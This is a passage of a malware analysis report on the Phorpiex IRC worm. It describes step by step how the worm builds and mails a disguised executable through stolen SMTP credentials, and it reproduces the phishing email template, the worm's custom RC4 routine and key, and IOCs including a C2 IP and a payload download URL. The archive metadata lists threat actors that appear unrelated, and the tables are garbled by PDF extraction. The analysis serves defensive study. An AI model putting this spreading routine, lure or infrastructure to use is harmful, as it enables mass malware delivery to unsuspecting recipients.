e.g.,\n```\n  C:\\Users\\User\\AppData\\Local\\Temp\\vgagsbbnkw.jpg. This file will receive the\n\n```\nexecutable that will be spread by mail.\n\n9. Sleep 0 to 30 seconds, determined uniformly at random.\n\n10. Download <url>d.exe to the random file.\n\n11. Create another url <url>s.txt. Create another temp file with the same pattern as in\n\nStep 8 and download from the url to the new temp path. This file holds SMTP servers\nalong with the credentials.\n\n12. Build a random zip file <TEMP>/<RANDOM_10_LETTERS>.zip, this ZIP file will receive the\n\nexecutable later sent by mail.\n\n13. Create a random scr filename: DOC<RAND_10_DIGITS>-PDF.scr, e.g., DOC7566358436```\n  PDF.scr. This is the filename that the executable inside the ZIP gets.\n\n```\n\n-----\n\n14. Create a random jpg <TEMP>/<RANDOM_10_LETTERS>.jpg. This file will receive the\n\nbase64 encoded version of the ZIP file. Phorpiex needs the base64 encoding for the\nSMTP MIME transfer.\n\n15. Write the downloaded executable from Step 10 to the ZIP file from Step 12. The ZIP file\n\nis built manually, field by field. First the header is written:\n\nThe local header signature: PK\\x03\\x04\nThe required version: 10\nGeneral purpose bit flag: 0 (no compression)\nFile last modification time and date: set to the current time and date.\nCRC-32: Calculated for the downloaded executable.\nCompressed and Uncompressed size: Set to the file size of the downloaded\nexecutable (as there is no compression used, the two are equal).\nFile name length (n): Length of the random scr string from Step 13, should always\nbe 0x15\nExtra field length (m): Set to zero.\nFile name: Filename from Step 13.\nThen the downloaded file content is written to the ZIP file. Finally:\n\nThe local header signature: PK\\x03\\x04\nThe central directory is written.\nThe end of central directory record is written.\nThe following image shows an example. Z stands for the downloaded executable\ncontent:\n\n16. The ZIP file from Step 15 is base64 encoded and written to the “jpg”-file from Step 14.\n\nThe zip file is deleted thereafter.\n\n17. The url <url><r>.txt is built, where <url> is the decrypted url from Step 2, and <r> _=_\n\n_rand() % (nr + 1), with nr from Step 5. The file is downloaded to a new random JPG file_\nwith pattern as in Step 14. This file holds the mail recipients.\n\n\n-----\n\n18. Next, the following steps are repeated 2000 times (unless the task is aborted by an\n```\n   m.off message):\n\n```\nSpawn a mailing thread described in the next Section. Don’t wait for its\ncompletion.\nSleep between 0 and 100 milliseconds, randomly determined.\n19. After the 2000 threads have been spawned, the download file from Step 10 is deleted\n\nand the task is finished.\n\nTo summarize these are the files used by this task:\n\n**path** **source** **step** **description**\n\n\nA `%TEMP%/<10_random_letters>.jpg` `<url>d.exe` 8,\n10\n\n\nthe (malicious) executable\n\n\nB `%TEMP%/<10_random_letters>.jpg` `<url>s.exe` 11 the list of SMTP servers\nand credentials\n\n\nC `%TEMP%/<10_random_letters>.zip` ZIP(B) 12,\n15\n\nD `%TEMP%/<10_random_letters>.jpg` BASE64(C) 14,\n16\n\n\nthe zipped executable\n\nthe base64 encoding of the\nzip file\n\n\nE `%TEMP%/<10_random_letters>.jpg` `<url>`\n```\n                      <r>.txt\n\n```\n**Mailing Thread**\n\nThe mailing routine performs the following steps:\n\n\n17 the list of recipients\n\n\n1. A random line from the file from file E (Step 17) is picked. This line contains the mail\n\naddress of the recipient.\n\n2. A random line from the file from file B (Step 11) is picked. The line contains the\n\nfollowing information:\n```\n  <server>|<username>|<password>|<port>\n\n\n```\nwhere <server> and <port> are the hostname and port of a SMTP server respectively;\nwith authentication <username> and <password>.\n\n3. The SMTP server is connected to on the provided <port>. If the server response\n\ncontains ESMTP, then EHLO verb, else the HELO verb.\n\n4. Phorpiex then tries to resolve the random domain of pattern <4 digits>.com. The\n\nmalware generates those random domains until one resolves to an IP.\n\n\n-----\n\n5. Phorpiex authenticates with AUTH LOGIN and passing the base64 encoded <username>\n\nand <password>. If this is successful (response is 334 after AUTH LOGIN and sending\nthe username, and 235 after sending the password), then the mail in the next Section is\nsent to the <recipient>.\n\n**Mail**\n\nPhorpiex sends the following mail:\n```\nMAIL FROM: <[firstname][2_random_digits]@[domain]> \n\nRCPT TO: <[recv_email]> \n\nDATA\n\nReceived: from [5_random_letters] ([random_ip]) by [domain] with MailEnable ESMTP;\n[date]\n\nReceived: (qmail [3_random_digits] invoked by uid [3_random_digits]); [date]\n\nFrom: [firstname] [last_name] [send_email]\n\nTo: [recv_email]\n\nSubject: [random_subject][4_random_digits]\n\nDate: [date]\n\nMessage-ID: <[14_random_digits].[4_random_digits].qmail@[6_random_letters]\n\nMime-Version: 1.0\n\nContent-Type: multipart/mixed; boundary= \"[boundary]\"\n\n-- [boundary]\n\nContent-Type: text/plain; charset=US-ASCII\n\nDear Customer\n\nto see more details about your order please open the attachment\n\nand reply as soon as possible.\n\nThank you,\n\nAWG Customer Service\n\n-- [boundary]\n\nContent-Type: application/octet-stream\n\nContent-Transfer-Encoding: base64\n\nContent-Disposition: attachment; filename= \"DOC[10_random_digits].zip\"\n\n[payload]\n\n-- [boundary]\n\n--\n.\n\n\n```\nwith:\n\n\n-----\n\n```\n   [firstname]: randomly picked name from this list: Adolfo, Adolph, Adrian, Adrian,\n\n```\n_Adriana, Adrienne, Agnes, Agustin, Ahmad, Ahmed, Aida, Aileen, Aimee, Aisha,_\n_Beulah, Beverley, Beverly, Bianca, Bill, Billie, Billie, Billy, Blaine, Blair, Blake, Blanca,_\n_Blanche, Bob, Bobbi, Bobbie, Bobby, Bonita, Bonnie, Booker, Boris, Boyd, Brad,_\n_Bradford, Bradley, Bradly, Brady, Deann, Deanna, Deanne, Debbie, Debora, Deborah,_\n_Debra, Dee, Dee, Deena, Deidre, Deirdre, Delbert, Delia, Gilda, Gina, Ginger, Gino,_\n_Giovanni, Gladys, Glen, Glenda, Glenn, Glenna, Gloria, Goldie, Gonzalo, Gordon,_\n_Hugh, Hugo, Humberto, Hung, Hunter, Ian, Ida, Ignacio, Ila, Ilene, Imelda, Imogene,_\n_Ina, Ines, Tania, Tanisha, Tanner, Tanya, Tara, Tasha, Taylor, Taylor, Ted, Teddy,_\n_Terence, Teresa, Teri, Terra_\n```\n   [last_name]: randomly picked name for this list: Bailey, Rivera, Cooper, Richardson,\n\n```\n_Cox, Howard, Ward, Torres, Peterson, Gray, Ramirez, James, Baker, Gonzalez,_\n_Nelson, Carter, Mitchell, Perez, Roberts, Turner, Phillips, Campbell, Parker, Evans,_\n_Edwards, Collins, Stewart, Sanchez, Morris, Rogers, Reed, Cook, Morgan, Bell,_\n_Murphy, Jackson, White, Harris, Martin, Thompson, Garcia, Martinez, Robinson, Clark,_\n_Rodriguez, Lewis, Lee, Walker, Hall, Allen, Young, Hernandez, King, Wright, Lopez,_\n_Hill, Scott, Green, Adams, Smith, Johnson, Williams, Jones, Brown, Davis, Miller,_\n_Wilson, Moore, Taylor, Anderson, Thomas, Watson, Brooks, Kelly, Sanders, Price,_\n_Bennett, Wood, Barnes, Ross, Henderson, Coleman, Jenkins_\n```\n   [domain]: the four-digit .com domain from Step 4 in the previous Section.\n   [random_ip]: randomly determined IP by picking four integers 1 to 255.\n   [date]: the current date.\n   [send_email]: The random email address built in Originating Email Address.\n   [recv_email]: the mail address from file E.\n   [random_subject]: one of the following 7 subjects: “Document #\", “Your Document #\",\n\n```\n_“Order #\", “Your Order #\", “Invoice #\", “Payment #\", “Payment Invoice #\"_\n```\n   [random_boundary]: random mime boundary of format\n   <6_random_letters>_<8_random_letters>_<4_random_letters>\n   [payload]: the base64 encoded zip file D.\n\n```\nFor example:\n\n\n-----\n\n```\nMAIL FROM: <Adrian32@1234.com>\n\nRCPT TO: <victim@example.com>\n\nDATA\n\nReceived: from yehdk ([39.212.182.82]) by 1234.com with MailEnable ESMTP; Thu, 18 Feb\n2016 03:45:08 -0700 (PDT)\n\nReceived: (qmail 921 invoked by uid 381); Thu, 18 Feb 2016 03:45:08 -0700 (PDT)\n\nFrom: Adrian Cox <Adrian32@1234.com>\n\nTo: <victim@example.com>\n\nSubject: Invoice #3829\n\nDate: Thu, 18 Feb 2016 03:45:08 -0700 (PDT)\n\nMessage-ID: <82847121234313.9232.qmail@abyuee\n\nMime-Version: 1.0\n\nContent-Type: multipart/mixed; boundary= \"udkeja_ueybmsqw_uoer\"\n\n-- udkeja_ueybmsqw_uoer\n\nContent-Type: text/plain; charset=US-ASCII\n\nDear Customer\n\nto see more details about your order please open the attachment\n\nand reply as soon as possible.\n\nThank you,\n\nAWG Customer Service\n\n-- udkeja_ueybmsqw_uoer\n\nContent-Type: application/octet-stream\n\nContent-Transfer-Encoding: base64\n\nContent-Disposition: attachment; filename= \"DOC8253877622.zip\"\n\nbWFsaWNpb3VzIGNvZGU= \n\n-- udkeja_ueybmsqw_uoer\n\n--\n.\n\n```\nAfter sending the mail, Phorpiex exits the SMTP server with QUIT\n\n### m.x - Mail Exe without Server List\n\nThe fourth and last task is very similar to m.s\n\n**format**\n```\nm.x <enc_url> <nr_of_files> |\n\n```\n**nr of parameters**\n2 |\n\n**subtypes**\nnone |\n\n**example**\n\n\n-----\n\n```\nm.x |108|99|(...)|106| 302 |\n\n```\n**description**\nMail an Executable |\n\n**task id**\n2 (exclusive) |\n\nThe differences to m.s are the following:\n\nThe task uses ID 2 instead of 3.\n\nStep 11 is skipped, i.e., no file B of SMTP servers is downloaded.\n\nIn lieu of the SMTP server file, Phorpiex uses the following target information:\n```\n      [server]: the server is set to the domain part of the target email address, e.g.,\n\n```\nthe target mail victim@example.com would yield the server example.com.\n```\n      [username]: (null)\n      [password]: (null)\n      [port]: set to 25\n\n```\nThe SMTP authentication is skipped.\n\n## RC4 Implementation\n\nAll URLs sent to the client are encrypted with a non-standard RC4 cipher. The ciphertext\nbytes are sent as integers separated and enclosed by the pipe symbol |. For example, the\nbytes \\x0B\\xAD are transmitted as |11|173|.\n\nThe RC4 implementation differs from the standard in two points:\n\n1. the state vector S only has 40 elements instead of the common 256.\n[2. the implementation uses the XOR swap algorithm to permutate S, both in key-](https://en.wikipedia.org/wiki/XOR_swap_algorithm)\n\nscheduling and in generating the keystream. The XOR swap algorithm, however, only\nworks on distinct values; in RC4 this is not necessary the case as i and j can be equal.\nIn those cases, the respective value is zeroed out.\n\nThe implementation in pseudo-code looks like that:\n\n\n-----\n\n```\nFOR i FROM 0 to 39\n\n  S[i] := i\n\nENDFOR\n\nj := 0\n\nFOR i FROM 0 to 39\n\n  j:= (j + S[i] + key[i mod keylength]) mod 40\n\n  S[i] ^= S[j]\n\n  S[j] ^= S[i]\n\n  S[i] ^= S[j]\n\nENDFOR\n\ni := 0\n\nj := 0\n\nFOR c IN ciphertext\n\n  i := (i+1) mod 40\n\n  j := (j + S[j]) mod 40\n\n  S[i] ^= S[j]\n\n  S[j] ^= S[i]\n\n  S[i] ^= S[j]\n\n  K = S[(S[i] + S[j]) mod 40]\n\n  OUTPUT c XOR K\n\nENDFOR\n\n```\nThe key to decipher the URLs is hardcoded to trk, with the key length hard-coded to 2; so\nthe actual key is tr.\n\n## IOCs\n\n**IOC (Example)** **Type** **Remarks**\n\n`w6` mutex also the\nname of\nupdates\n\n```\n%Temp%\\<10_random_letters>.bat\n\n```\n(C:\\Users\\User\\AppData\\Local\\Temp\\ukelbadejs.bat)\n```\n{%windir%,%userprofile%,%temp%}\\M50504503224255244048500220524542045\\winsvc.exe\n\n```\n(C:\\Users\\User\\M```\n50504503224255244048500220524542045\\winsvc.exe)\n\n```\n\ncleanup\nBAT file\n\nbinary\nlocation\n\n\n`220.181.87.80:5050` IRC\nserver\n\n\nthe only\nIRC used\nby the\nsample\n\n\n-----\n\n**IOC (Example)** **Type** **Remarks**\n\n```\n http://sideworkcreative.com/go.exe (hacked site)(hacked\n\n```\nsite)(hacked site)(hacked site)(hacked site)(hacked site)(hacked\nsite)(hacked site)(hacked site)\n\n## Archived Comments\n\n\ndownload\nURL\n\n\nobserved\nURL to\ndownload\nadditional\nbinaries\n\n\n**_Note: I removed the Disqus integration in an effort to cut down on bloat. The following_**\n_comments were retrieved with the export functionality of Disqus. If you have comments,_\n_please reach out to me by Twitter or email._\n\n[Metahuman Feb 24, 2016 18:11:26 UTC](https://disqus.com/by/metahuman/)\nThis looks like a normal SDBot from the olden times.\n\n[Johannes Bader Feb 24, 2016 18:31:18 UTC](https://disqus.com/by/baderj/)\nYes, the two are definitely related. McAfee and others still use the name SDBot. Microsoft\nstarted to use the name Phorpiex instead.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-02-21 - Phorpiex - An IRC worm.pdf"
    ],
    "report_names": [
        "2016-02-21 - Phorpiex - An IRC worm.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1683338970,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1683251717,
    "ts_modification_date": 1683251717,
    "files": {
        "pdf": "https://archive.orkl.eu/23959da0143456f9fc82fe92892b26b666a014c2.pdf",
        "text": "https://archive.orkl.eu/23959da0143456f9fc82fe92892b26b666a014c2.txt",
        "img": "https://archive.orkl.eu/23959da0143456f9fc82fe92892b26b666a014c2.jpg"
    }
}